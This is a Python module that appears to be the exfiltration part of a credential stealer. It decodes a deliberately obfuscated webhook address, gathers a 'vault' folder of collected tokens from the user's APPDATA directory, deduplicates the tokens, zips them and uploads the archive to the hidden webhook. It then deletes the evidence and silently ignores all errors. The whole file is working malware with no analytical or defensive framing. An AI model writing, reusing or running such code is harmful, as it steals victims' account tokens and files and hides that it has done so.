import os, zipfile, shutil, requests
from co.config import WEBHOOK_URI
import time, base64
decoded_uri = base64.b64decode(WEBHOOK_URI).decode('utf-8')
swapped_case = decoded_uri.swapcase()
reversed_uri = swapped_case[::-1]
WEBHOOK_URL = reversed_uri
def zipnsend():
    vault_folder = os.path.join(os.getenv('APPDATA'), 'vault')
    zip_file_path = os.path.join(os.getenv('APPDATA'), 'vault.zip')
    confirm_file = os.path.join(vault_folder, 'confirmation.fullbright')
    token_file = os.path.join(vault_folder, 'token.txt')
    if os.path.exists(vault_folder) and os.path.exists(confirm_file):
        try:
            os.remove(confirm_file)
            time.sleep(1)
            if os.path.exists(token_file):
                with open(token_file, 'r') as f:
                    lines = f.readlines()
                unique_lines = []
                seen_tokens = set()
                for line in lines:
                    if line.startswith("Token:"):
                        token = line.strip().split(" ")[1]
                        if token not in seen_tokens:
                            seen_tokens.add(token)
                            unique_lines.append(line)
                    else:
                        unique_lines.append(line)
                with open(token_file, 'w') as f:
                    f.writelines(unique_lines)
            with zipfile.ZipFile(zip_file_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
                for root, _, files in os.walk(vault_folder):
                    for file in files:
                        zipf.write(os.path.join(root, file), os.path.relpath(os.path.join(root, file), vault_folder))
            shutil.rmtree(vault_folder)
            with open(zip_file_path, 'rb') as f:
                requests.post(WEBHOOK_URL, files={'file': (os.path.basename(zip_file_path), f)})
            os.remove(zip_file_path)
        except Exception:
            pass